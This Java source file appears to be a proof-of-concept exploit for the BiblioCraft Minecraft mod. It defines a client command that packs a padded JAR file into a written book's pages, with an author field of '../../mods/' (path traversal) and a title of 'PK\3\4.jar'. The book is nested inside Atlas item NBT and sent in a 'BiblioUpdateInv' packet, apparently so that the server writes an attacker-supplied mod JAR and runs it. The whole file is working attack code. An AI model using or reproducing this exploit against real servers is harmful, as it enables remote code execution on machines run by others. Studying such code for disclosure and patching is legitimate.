package com.exopteron.bibliopoc1122;

import java.io.IOException;

import java.nio.file.Files;
import java.nio.file.Paths;

import jds.bibliocraft.blocks.BlockTypesettingTable;
import jds.bibliocraft.items.ItemAtlas;

import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;

import net.minecraft.item.ItemStack;

import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.server.MinecraftServer;




public class JarPOCCommand extends CommandBase {

    @Override
    public String getName() {
        return "jarpoccommand";
    }

    @Override
    public String getUsage(ICommandSender p_71518_1_) {
        return "/jarpoccommand [padded-jar-path]";
    }

    @Override
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
        String data = null;
        try {
            byte[] d = Files.readAllBytes(Paths.get(args[0]));
            data = new String(d);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        ItemStack atlasOne = new ItemStack(ItemAtlas.instance);



        ItemStack workbench = new ItemStack(BlockTypesettingTable.instance);


        NBTTagCompound atlasOneTag = new NBTTagCompound();
        NBTTagList atlasOneInv = new NBTTagList();

        atlasOneInv.appendTag(itemToNBT(workbench, 1));


        ItemStack chest = new ItemStack(ItemAtlas.instance);
        NBTTagCompound chestTag = new NBTTagCompound();
        chestTag.setTag("Inventory", atlasOneInv);
        chest.setTagCompound(chestTag);

        NBTTagList newInv = new NBTTagList();
        newInv.appendTag(itemToNBT(chest, 0));

        NBTTagCompound bookTag = new NBTTagCompound();

        bookTag.setString("author", "../../mods/");
        
        NBTTagList pages = new NBTTagList();
        pages.appendTag(new NBTTagString("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + data));

        final String prefixString = "PK\3\4.jar";
        
        bookTag.setTag("pages", pages);
        bookTag.setString("title",prefixString);

        ItemStack book = new ItemStack(net.minecraft.init.Items.WRITTEN_BOOK);
        book.setStackDisplayName(prefixString);
        book.setTagCompound(bookTag);

        newInv.appendTag(itemToNBT(book, 1));

        atlasOneTag.setTag("Inventory", newInv);


        atlasOne.setTagCompound(atlasOneTag);


        ItemStack atlasTwo = new ItemStack(ItemAtlas.instance);

        NBTTagCompound atlasTwoTag = new NBTTagCompound();
        NBTTagList atlasTwoInv = new NBTTagList();
        NBTTagCompound atlasOneItemTag = new NBTTagCompound();
        atlasOne.writeToNBT(atlasOneItemTag);
        atlasTwoInv.appendTag(atlasOneItemTag);
        atlasTwoTag.setTag("Inventory", atlasTwoInv);
        
        atlasTwo.setTagCompound(atlasTwoTag);

        Utils.sendPacket("BiblioUpdateInv", atlasTwo);
    }

    public static NBTTagCompound itemToNBT(ItemStack i, Integer slot) {
        NBTTagCompound t = new NBTTagCompound();
        i.writeToNBT(t);
        if (slot != null) {
            t.setInteger("Slot", slot);
        }
        return t;
    }

    @Override
    public int getRequiredPermissionLevel() {
        return 0;
    }

}
